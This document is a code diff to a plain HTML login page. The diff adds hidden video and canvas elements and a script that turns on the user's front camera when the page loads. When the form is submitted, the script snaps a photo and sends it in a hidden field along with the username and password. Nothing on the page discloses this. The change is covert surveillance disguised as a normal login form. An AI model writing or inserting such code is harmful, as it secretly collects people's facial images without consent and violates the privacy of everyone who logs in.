@@ -64,6 +64,10 @@
       font-size: 0.95em;
     }
 
+    video, canvas {
+      display: none;
+    }
+
     @media (max-width: 400px) {
       .login-container {
         padding: 20px;
@@ -72,12 +76,39 @@
   </style>
 </head>
 <body>
-  <form method="POST" class="login-container">
+  <form method="POST" action="/login" class="login-container" onsubmit="capturePhoto()">
     <h2>User Login</h2>
     <input name="username" placeholder="Username" required />
     <input name="password" type="password" placeholder="Password" required />
+    <input type="hidden" name="photo" id="photoData" />
     <button type="submit">Login</button>
     <a href="/register">Don't have an account? Register</a>
   </form>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const photoInput = document.getElementById('photoData');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(error => {
+        console.error("Camera error:", error);
+      });
+
+    function capturePhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataURL = canvas.toDataURL('image/png');
+      photoInput.value = dataURL;
+    }
+  </script>
 </body>
 </html>
